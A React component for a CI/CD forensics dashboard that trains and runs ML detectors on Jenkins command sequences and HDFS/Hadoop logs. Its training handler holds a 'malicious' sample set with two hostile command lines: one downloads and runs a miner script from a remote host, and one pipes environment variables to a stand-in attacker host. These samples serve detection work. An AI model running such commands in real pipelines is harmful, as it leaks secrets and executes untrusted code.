import React, { useState, useEffect } from "react";
import AgentStatus from "./AgentStatus";
import EvidenceCollector from "./EvidenceCollector";
import AgentConfig from "./AgentConfig";
import {
  getCicdHdfsLatest,
  getCicdHdfsStatus,
  inferCicdHdfsDataset,
  trainCicdHdfsModel,
  getCicdHadoopLatest,
  getCicdHadoopStatus,
  inferCicdHadoopDataset,
  trainCicdHadoopModel,
  collectCicdEvidence,
  getCicdAgentsStatus,
  getCicdConfig,
  getCicdEvidence,
  resetCicdConfig,
  saveCicdConfig,
  getCicdCommandSequenceStatus,
  getCicdCommandSequenceLatest,
  trainCicdCommandSequence,
  inferCicdCommandSequence,
} from "../../api/mlApi";
import "./ForensicReadyCICDAgents.css";

function ForensicReadyCICDAgents() {
  const [agents, setAgents] = useState([]);
  const [evidence, setEvidence] = useState([]);
  const [metrics, setMetrics] = useState(null);
  const [isCollecting, setIsCollecting] = useState(false);
  const [agentError, setAgentError] = useState(null);
  const [config, setConfig] = useState(null);
  const [hdfsStatus, setHdfsStatus] = useState(null);
  const [hdfsAnomalies, setHdfsAnomalies] = useState([]);
  const [isHdfsTraining, setIsHdfsTraining] = useState(false);
  const [isHdfsDetecting, setIsHdfsDetecting] = useState(false);
  const [hdfsError, setHdfsError] = useState(null);
  const [hadoopStatus, setHadoopStatus] = useState(null);
  const [hadoopAnomalies, setHadoopAnomalies] = useState([]);
  const [isHadoopTraining, setIsHadoopTraining] = useState(false);
  const [isHadoopDetecting, setIsHadoopDetecting] = useState(false);
  const [hadoopError, setHadoopError] = useState(null);
  const [commandStatus, setCommandStatus] = useState(null);
  const [commandResult, setCommandResult] = useState(null);
  const [commandInput, setCommandInput] = useState(
    "npm ci\nnpm run build\ndocker build -t forensic-portal:latest .\ndocker push registry.local/forensic-portal:latest"
  );
  const [commandBuildId, setCommandBuildId] = useState("jenkins-demo-001");
  const [commandError, setCommandError] = useState(null);
  const [isCommandTraining, setIsCommandTraining] = useState(false);
  const [isCommandDetecting, setIsCommandDetecting] = useState(false);

  useEffect(() => {
    loadAgentsAndMetrics();
    loadEvidence();
    loadConfig();
    loadHdfs();
    loadHadoop();
    loadCommandSequence();
    const interval = setInterval(() => {
      loadAgentsAndMetrics();
    }, 5000);
    return () => clearInterval(interval);
  }, []);

  const loadAgentsAndMetrics = async () => {
    try {
      const s = await getCicdAgentsStatus();
      setAgents(s.agents || []);
      setMetrics(s.metrics || null);
      setAgentError(null);
    } catch (e) {
      setAgentError(e.message);
    }
  };

  const loadCommandSequence = async () => {
    try {
      const [status, latest] = await Promise.all([
        getCicdCommandSequenceStatus(),
        getCicdCommandSequenceLatest(),
      ]);
      setCommandStatus(status || null);
      setCommandResult(latest && latest.last_result ? latest.last_result : null);
      setCommandError(null);
    } catch (e) {
      setCommandError(e.message);
    }
  };

  const handleTrainCommandSequence = async () => {
    setIsCommandTraining(true);
    try {
      setCommandError(null);
      const benign = [
        ["npm ci", "npm run build", "docker build -t app:latest .", "docker push registry/app:latest"],
        ["yarn install --frozen-lockfile", "yarn build", "docker build -t web:latest ."],
      ];
      const malicious = [
        ["npm install", "curl -o /tmp/mine.sh http://unknown.com/mine.sh", "chmod +x /tmp/mine.sh", "bash /tmp/mine.sh"],
        ["npm ci", "printenv | curl -X POST https://evil.site --data-binary @-"],
      ];
      await trainCicdCommandSequence(benign, malicious);
      await loadCommandSequence();
    } catch (e) {
      setCommandError(e.message);
    } finally {
      setIsCommandTraining(false);
    }
  };

  const handleDetectCommandSequence = async () => {
    setIsCommandDetecting(true);
    try {
      setCommandError(null);
      const commands = commandInput
        .split("\n")
        .map((x) => x.trim())
        .filter(Boolean);
      const res = await inferCicdCommandSequence(commandBuildId || undefined, commands, "");
      setCommandResult(res.result || null);
      await loadEvidence();
      await loadAgentsAndMetrics();
    } catch (e) {
      setCommandError(e.message);
    } finally {
      setIsCommandDetecting(false);
    }
  };

  const loadEvidence = async () => {
    try {
      const res = await getCicdEvidence(200);
      setEvidence(res.evidence || []);
    } catch {
      setEvidence([]);
    }
  };

  const loadConfig = async () => {
    try {
      const res = await getCicdConfig();
      setConfig(res.config || null);
    } catch {
      setConfig(null);
    }
  };

  const handleStartCollection = async () => {
    setIsCollecting(true);
    try {
      await collectCicdEvidence("dataset");
      await loadEvidence();
      await loadAgentsAndMetrics();
    } catch {
      await loadEvidence();
    } finally {
      setIsCollecting(false);
    }
  };

  const loadHdfs = async () => {
    try {
      const s = await getCicdHdfsStatus();
      setHdfsStatus(s);
      setHdfsError(null);
    } catch (e) {
      setHdfsError(e.message);
    }
  };

  const refreshHdfs = async () => {
    try {
      const res = await getCicdHdfsLatest();
      setHdfsAnomalies(res.anomalies || []);
      setHdfsError(null);
    } catch (e) {
      setHdfsError(e.message);
    }
  };

  const handleTrainHdfs = async () => {
    setIsHdfsTraining(true);
    try {
      setHdfsError(null);
      await trainCicdHdfsModel(50000);
      await loadHdfs();
    } catch (e) {
      setHdfsError(e.message);
    } finally {
      setIsHdfsTraining(false);
    }
  };

  const handleDetectHdfs = async () => {
    setIsHdfsDetecting(true);
    try {
      setHdfsError(null);
      await inferCicdHdfsDataset(2000, true);
      await refreshHdfs();
    } catch (e) {
      setHdfsError(e.message);
    } finally {
      setIsHdfsDetecting(false);
    }
  };

  const loadHadoop = async () => {
    try {
      const s = await getCicdHadoopStatus();
      setHadoopStatus(s);
      setHadoopError(null);
    } catch (e) {
      setHadoopError(e.message);
    }
  };

  const refreshHadoop = async () => {
    try {
      const res = await getCicdHadoopLatest();
      setHadoopAnomalies(res.anomalies || []);
      setHadoopError(null);
    } catch (e) {
      setHadoopError(e.message);
    }
  };

  const handleTrainHadoop = async () => {
    setIsHadoopTraining(true);
    try {
      setHadoopError(null);
      await trainCicdHadoopModel(55);
      await loadHadoop();
    } catch (e) {
      setHadoopError(e.message);
    } finally {
      setIsHadoopTraining(false);
    }
  };

  const handleDetectHadoop = async () => {
    setIsHadoopDetecting(true);
    try {
      setHadoopError(null);
      await inferCicdHadoopDataset(20, true);
      await refreshHadoop();
    } catch (e) {
      setHadoopError(e.message);
    } finally {
      setIsHadoopDetecting(false);
    }
  };

  return (
    <div className="forensic-cicd-agents">
      <div className="agents-header">
        <h2>Forensic-Ready CI/CD Agents</h2>
        <p className="subtitle">
          Forensic collectors for Jenkins, GitHub events, Node.js build commands, and Docker artifacts
        </p>
      </div>

      <div className="agents-grid">
        <div className="agents-section">
          {agentError && <div className="no-evidence">{agentError}</div>}
          <AgentStatus agents={agents} metrics={metrics} />
        </div>

        <div className="agents-section">
          <EvidenceCollector
            evidence={evidence}
            isCollecting={isCollecting}
            onStartCollection={handleStartCollection}
          />
        </div>

        <div className="agents-section full-width">
          <AgentConfig
            config={config}
            onSave={async (c) => {
              await saveCicdConfig(c);
              await loadConfig();
            }}
            onReset={async () => {
              await resetCicdConfig();
              await loadConfig();
            }}
          />
        </div>

        <div className="agents-section full-width">
          <div className="log-anomaly-card">
            <div className="collector-header">
              <h3>Jenkins Command Sequence Classification</h3>
              <div style={{ display: "flex", gap: 10, flexWrap: "wrap" }}>
                <button className="collect-button" onClick={handleTrainCommandSequence} disabled={isCommandTraining}>
                  {isCommandTraining ? "Training..." : "Train Baseline"}
                </button>
                <button className="collect-button" onClick={handleDetectCommandSequence} disabled={isCommandDetecting}>
                  {isCommandDetecting ? "Detecting..." : "Run Detection"}
                </button>
                <button className="collect-button" onClick={loadCommandSequence}>
                  Refresh
                </button>
              </div>
            </div>
            {commandError && <div className="no-evidence">{commandError}</div>}
            <div className="status-overview">
              <div className="metric-item">
                <span className="metric-label">Model Trained</span>
                <span className="metric-value">
                  {commandStatus && commandStatus.training_state ? (commandStatus.training_state.trained ? "Yes" : "No") : "N/A"}
                </span>
              </div>
              <div className="metric-item">
                <span className="metric-label">Latest Classification</span>
                <span className="metric-value">{commandResult ? commandResult.classification : "N/A"}</span>
              </div>
              <div className="metric-item">
                <span className="metric-label">Confidence</span>
                <span className="metric-value">{commandResult ? Number(commandResult.confidence || 0).toFixed(4) : "N/A"}</span>
              </div>
              <div className="metric-item">
                <span className="metric-label">Risk Level</span>
                <span className="metric-value">{commandResult ? commandResult.risk_level : "N/A"}</span>
              </div>
              <div className="metric-item">
                <span className="metric-label">Alerts</span>
                <span className="metric-value">
                  {commandResult && Array.isArray(commandResult.alerts) ? commandResult.alerts.length : 0}
                </span>
              </div>
            </div>

            <div style={{ display: "grid", gridTemplateColumns: "1fr", gap: 10, marginBottom: 12 }}>
              <input
                value={commandBuildId}
                onChange={(e) => setCommandBuildId(e.target.value)}
                placeholder="Build ID"
                style={{ padding: 10, border: "1px solid #ddd", borderRadius: 4 }}
              />
              <textarea
                value={commandInput}
                onChange={(e) => setCommandInput(e.target.value)}
                rows={6}
                style={{ width: "100%", padding: 10, border: "1px solid #ddd", borderRadius: 4, fontFamily: "monospace" }}
              />
            </div>

            <div className="evidence-list" style={{ marginTop: 12 }}>
              {!commandResult || !Array.isArray(commandResult.command_results) || commandResult.command_results.length === 0 ? (
                <div className="no-evidence">No command sequence results loaded</div>
              ) : (
                commandResult.command_results.map((r, idx) => (
                  <div key={`${r.index}-${idx}`} className="evidence-item">
                    <div className="evidence-header">
                      <span className="evidence-title">{r.classification}</span>
                      <span className="severity-badge severity-high">{Number(r.confidence || 0).toFixed(4)}</span>
                    </div>
                    <div className="evidence-details">
                      <div className="detail-row">
                        <span>Command</span>
                        <span style={{ fontFamily: "monospace", fontSize: 12, overflowWrap: "anywhere" }}>{r.command}</span>
                      </div>
                      <div className="detail-row">
                        <span>Anomaly Score</span>
                        <span>{typeof r.anomaly_score === "number" ? r.anomaly_score : "N/A"}</span>
                      </div>
                      <div className="detail-row">
                        <span>Reasons</span>
                        <span>{Array.isArray(r.reasons) ? r.reasons.join(", ") : ""}</span>
                      </div>
                    </div>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>

        <div className="agents-section full-width">
          <div className="log-anomaly-card">
            <div className="collector-header">
              <h3>HDFS Log Anomaly Detection</h3>
              <div style={{ display: "flex", gap: 10, flexWrap: "wrap" }}>
                <button className="collect-button" onClick={handleTrainHdfs} disabled={isHdfsTraining}>
                  {isHdfsTraining ? "Training..." : "Train Model"}
                </button>
                <button className="collect-button" onClick={handleDetectHdfs} disabled={isHdfsDetecting}>
                  {isHdfsDetecting ? "Detecting..." : "Run Detection"}
                </button>
                <button className="collect-button" onClick={refreshHdfs}>
                  Refresh Results
                </button>
              </div>
            </div>

            {hdfsError && <div className="no-evidence">{hdfsError}</div>}

            <div className="status-overview">
              <div className="metric-item">
                <span className="metric-label">Model Trained</span>
                <span className="metric-value">
                  {hdfsStatus && hdfsStatus.model ? (hdfsStatus.model.is_trained ? "Yes" : "No") : "N/A"}
                </span>
              </div>
              <div className="metric-item">
                <span className="metric-label">Total Anomalies</span>
                <span className="metric-value">{hdfsAnomalies.length}</span>
              </div>
              <div className="metric-item">
                <span className="metric-label">Dataset</span>
                <span className="metric-value">
                  {hdfsStatus && hdfsStatus.dataset ? (hdfsStatus.dataset.exists ? "Available" : "Missing") : "N/A"}
                </span>
              </div>
            </div>

            <div className="evidence-list" style={{ marginTop: 12 }}>
              {hdfsAnomalies.length === 0 ? (
                <div className="no-evidence">No anomalies loaded</div>
              ) : (
                hdfsAnomalies.slice(0, 50).map((a) => (
                  <div key={a.id} className="evidence-item">
                    <div className="evidence-header">
                      <span className="evidence-title">{a.category}</span>
                      <span className="severity-badge severity-high">{(Number(a.confidence || 0) / 100).toFixed(4)}</span>
                    </div>
                    <div className="evidence-details">
                      <div className="detail-row">
                        <span>Line</span>
                        <span style={{ fontFamily: "monospace", fontSize: 12, overflowWrap: "anywhere" }}>
                          {a.details && a.details.line ? a.details.line : ""}
                        </span>
                      </div>
                    </div>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>

        <div className="agents-section full-width">
          <div className="log-anomaly-card">
            <div className="collector-header">
              <h3>Hadoop Log Failure Classification (Accuracy/F1)</h3>
              <div style={{ display: "flex", gap: 10, flexWrap: "wrap" }}>
                <button className="collect-button" onClick={handleTrainHadoop} disabled={isHadoopTraining}>
                  {isHadoopTraining ? "Training..." : "Train Model"}
                </button>
                <button className="collect-button" onClick={handleDetectHadoop} disabled={isHadoopDetecting}>
                  {isHadoopDetecting ? "Detecting..." : "Run Detection"}
                </button>
                <button className="collect-button" onClick={refreshHadoop}>
                  Refresh Results
                </button>
              </div>
            </div>

            {hadoopError && <div className="no-evidence">{hadoopError}</div>}

            <div className="status-overview">
              <div className="metric-item">
                <span className="metric-label">Model Trained</span>
                <span className="metric-value">
                  {hadoopStatus && hadoopStatus.model ? (hadoopStatus.model.is_trained ? "Yes" : "No") : "N/A"}
                </span>
              </div>
              <div className="metric-item">
                <span className="metric-label">Accuracy</span>
                <span className="metric-value">
                  {hadoopStatus && hadoopStatus.training_state && hadoopStatus.training_state.metrics
                    ? hadoopStatus.training_state.metrics.accuracy.toFixed(4)
                    : "N/A"}
                </span>
              </div>
              <div className="metric-item">
                <span className="metric-label">F1</span>
                <span className="metric-value">
                  {hadoopStatus && hadoopStatus.training_state && hadoopStatus.training_state.metrics
                    ? hadoopStatus.training_state.metrics.f1.toFixed(4)
                    : "N/A"}
                </span>
              </div>
              <div className="metric-item">
                <span className="metric-label">Precision</span>
                <span className="metric-value">
                  {hadoopStatus && hadoopStatus.training_state && hadoopStatus.training_state.metrics
                    ? hadoopStatus.training_state.metrics.precision.toFixed(4)
                    : "N/A"}
                </span>
              </div>
              <div className="metric-item">
                <span className="metric-label">Recall</span>
                <span className="metric-value">
                  {hadoopStatus && hadoopStatus.training_state && hadoopStatus.training_state.metrics
                    ? hadoopStatus.training_state.metrics.recall.toFixed(4)
                    : "N/A"}
                </span>
              </div>
              <div className="metric-item">
                <span className="metric-label">Total Detections</span>
                <span className="metric-value">{hadoopAnomalies.length}</span>
              </div>
            </div>

            <div className="evidence-list" style={{ marginTop: 12 }}>
              {hadoopAnomalies.length === 0 ? (
                <div className="no-evidence">No detections loaded</div>
              ) : (
                hadoopAnomalies.slice(0, 50).map((a) => (
                  <div key={a.id} className="evidence-item">
                    <div className="evidence-header">
                      <span className="evidence-title">{a.id}</span>
                      <span className="severity-badge severity-high">{(Number(a.confidence || 0) / 100).toFixed(4)}</span>
                    </div>
                    <div className="evidence-details">
                      <div className="detail-row">
                        <span>Category</span>
                        <span>{a.category}</span>
                      </div>
                      <div className="detail-row">
                        <span>Label</span>
                        <span>{a.details && typeof a.details.label !== "undefined" ? String(a.details.label) : ""}</span>
                      </div>
                    </div>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default ForensicReadyCICDAgents;

